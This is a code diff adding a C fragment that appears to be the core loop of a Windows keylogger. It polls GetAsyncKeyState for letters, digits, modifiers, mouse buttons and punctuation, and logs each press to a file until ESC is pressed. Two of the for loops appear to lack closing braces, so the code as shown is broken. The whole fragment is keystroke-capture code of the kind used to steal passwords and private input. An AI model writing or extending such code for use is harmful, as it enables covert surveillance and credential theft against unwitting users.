@@ -1,0 +1,147 @@
+
+	if ((GetAsyncKeyState(1) & 0x8000) && !keyDown[1]) {
+		fputs("[MOUSE1]\n", fp); fflush(fp); keyDown[1] = true; } 
+	else if (!(GetAsyncKeyState(1) & 0x8000)) keyDown[1] = false;
+
+	
+	if ((GetAsyncKeyState(2) & 0x8000) && !keyDown[2]) {
+		fputs("[MOUSE2]\n", fp); fflush(fp); keyDown[2] = true; } 
+	else if (!(GetAsyncKeyState(2) & 0x8000)) keyDown[2] = false;
+
+	
+	if ((GetAsyncKeyState(8) & 0x8000) && !keyDown[3]) {
+		fputs("[BACKSPACE]\n", fp); fflush(fp); keyDown[3] = true; } 
+	else if (!(GetAsyncKeyState(8) & 0x8000)) keyDown[3] = false;
+
+	
+	if ((GetAsyncKeyState(9) & 0x8000) && !keyDown[4]) {
+		fputs("[TAB]\n", fp); fflush(fp); keyDown[4] = true; } 
+	else if (!(GetAsyncKeyState(9) & 0x8000)) keyDown[4] = false;
+
+	
+	if ((GetAsyncKeyState(13) & 0x8000) && !keyDown[5]) {
+		fputs("[ENTER]\n", fp); fflush(fp); keyDown[5] = true; } 
+	else if (!(GetAsyncKeyState(13) & 0x8000)) keyDown[5] = false;
+
+	
+	
+	if ((GetAsyncKeyState(16) & 0x8000) && !keyDown[6]) {
+		fputs("[SHIFT]\n", fp); fflush(fp); keyDown[6] = true; } 
+	else if (!(GetAsyncKeyState(16) & 0x8000)) keyDown[6] = false;
+
+	
+	if ((GetAsyncKeyState(20) & 0x8000) && !keyDown[7]) {
+		fputs("[CAPS]\n", fp); fflush(fp); keyDown[7] = true; } 
+	else if (!(GetAsyncKeyState(20) & 0x8000)) keyDown[7] = false;
+
+	
+	if ((GetAsyncKeyState(27) & 0x8000) && !keyDown[8]) {
+		fputs("[ESC]\n", fp); fflush(fp); keyDown[8] = true; break; } 
+	else if (!(GetAsyncKeyState(27) & 0x8000)) keyDown[8] = false;
+
+	
+	if ((GetAsyncKeyState(32) & 0x8000) && !keyDown[9]) {
+		fputs("[SPACE]\n", fp); fflush(fp); keyDown[9] = true; } 
+	else if (!(GetAsyncKeyState(32) & 0x8000)) keyDown[9] = false;
+
+	
+	if ((GetAsyncKeyState(46) & 0x8000) && !keyDown[10]) {
+		fputs("[DEL]\n", fp); fflush(fp); keyDown[10] = true; } 
+	else if (!(GetAsyncKeyState(46) & 0x8000)) keyDown[10] = false;
+
+	
+	for (int i = 0; i <= 9; ++i) { 
+		int vk_code = 48 + i; 
+		int index = 11 + i;   
+		if ((GetAsyncKeyState(vk_code) & 0x8000) && !keyDown[index]) {
+			fprintf(fp, "[%d]\n", i); 	fflush(fp); keyDown[index] = true; } 
+			else if (!(GetAsyncKeyState(vk_code) & 0x8000)) {
+			keyDown[index] = false;
+	}
+
+	
+	for (int i = 0; i <= 25; ++i) { 
+int vk_code = 65 + i; 
+int index = 21 + i;   
+if ((GetAsyncKeyState(vk_code) & 0x8000) && !keyDown[index]) {
+	fprintf(fp, "[%c]\n", (char)('A' + i)); 	fflush(fp); keyDown[index] = true; } 
+	else if (!(GetAsyncKeyState(vk_code) & 0x8000)) {
+	keyDown[index] = false;
+	}
+
+	
+	
+	if ((GetAsyncKeyState(91) & 0x8000) && !keyDown[47]) { 
+		fputs("[MOD]\n", fp); fflush(fp); keyDown[47] = true; } 
+	else if (!(GetAsyncKeyState(91) & 0x8000)) keyDown[47] = false;
+
+	
+	if ((GetAsyncKeyState(162) & 0x8000) && !keyDown[48]) { 
+		fputs("[CTRL_LEFT]\n", fp); fflush(fp); keyDown[48] = true; } 
+	else if (!(GetAsyncKeyState(162) & 0x8000)) keyDown[48] = false;
+	if ((GetAsyncKeyState(163) & 0x8000) && !keyDown[49]) { 
+		fputs("[CTRL_RIGHT]\n", fp); fflush(fp); keyDown[49] = true; } 
+	else if (!(GetAsyncKeyState(163) & 0x8000)) keyDown[49] = false;
+
+	
+	if ((GetAsyncKeyState(164) & 0x8000) && !keyDown[50]) { 
+		fputs("[ALT_LEFT]\n", fp); fflush(fp); keyDown[50] = true; } 
+	else if (!(GetAsyncKeyState(164) & 0x8000)) keyDown[50] = false;
+	if ((GetAsyncKeyState(165) & 0x8000) && !keyDown[51]) { 
+		fputs("[ALT_RIGHT]\n", fp); fflush(fp); keyDown[51] = true; } 
+	else if (!(GetAsyncKeyState(165) & 0x8000)) keyDown[51] = false;
+
+	
+	if ((GetAsyncKeyState(186) & 0x8000) && !keyDown[52]) {
+		fputs("[; ]\n", fp); fflush(fp); keyDown[52] = true; } 
+	else if (!(GetAsyncKeyState(186) & 0x8000)) keyDown[52] = false;
+
+	
+	if ((GetAsyncKeyState(187) & 0x8000) && !keyDown[53]) {
+		fputs("[PLUS]\n", fp); fflush(fp); keyDown[53] = true; } 
+	else if (!(GetAsyncKeyState(187) & 0x8000)) keyDown[53] = false;
+
+	
+	if ((GetAsyncKeyState(188) & 0x8000) && !keyDown[54]) {
+		fputs("[,]\n", fp); fflush(fp); keyDown[54] = true; } 
+	else if (!(GetAsyncKeyState(188) & 0x8000)) keyDown[54] = false;
+
+	
+	if ((GetAsyncKeyState(189) & 0x8000) && !keyDown[55]) {
+		fputs("[MIN]\n", fp); fflush(fp); keyDown[55] = true; } 
+	else if (!(GetAsyncKeyState(189) & 0x8000)) keyDown[55] = false;
+
+	
+	if ((GetAsyncKeyState(190) & 0x8000) && !keyDown[56]) {
+		fputs("[.]\n", fp); fflush(fp); keyDown[56] = true; } 
+	else if (!(GetAsyncKeyState(190) & 0x8000)) keyDown[56] = false;
+
+	
+	if ((GetAsyncKeyState(191) & 0x8000) && !keyDown[57]) {
+		fputs("[/]\n", fp); fflush(fp); keyDown[57] = true; } 
+	else if (!(GetAsyncKeyState(191) & 0x8000)) keyDown[57] = false;
+
+	
+	if ((GetAsyncKeyState(192) & 0x8000) && !keyDown[58]) {
+		fputs("[`]\n", fp); fflush(fp); keyDown[58] = true; } 
+	else if (!(GetAsyncKeyState(192) & 0x8000)) keyDown[58] = false;
+
+	
+	if ((GetAsyncKeyState(219) & 0x8000) && !keyDown[59]) {
+		fputs("[[ ]\n", fp); fflush(fp); keyDown[59] = true; } 
+	else if (!(GetAsyncKeyState(219) & 0x8000)) keyDown[59] = false;
+
+	
+	if ((GetAsyncKeyState(220) & 0x8000) && !keyDown[60]) {
+		fputs("[ \\ ]\n", fp); fflush(fp); keyDown[60] = true; } 
+	else if (!(GetAsyncKeyState(220) & 0x8000)) keyDown[60] = false;
+
+	
+	if ((GetAsyncKeyState(221) & 0x8000) && !keyDown[61]) {
+		fputs("[ ] ]\n", fp); fflush(fp); keyDown[61] = true; } 
+	else if (!(GetAsyncKeyState(221) & 0x8000)) keyDown[61] = false;
+
+	
+	if ((GetAsyncKeyState(222) & 0x8000) && !keyDown[62]) {
+		fputs("[']\n", fp); fflush(fp); keyDown[62] = true; } 
+	else if (!(GetAsyncKeyState(222) & 0x8000)) keyDown[62] = false;
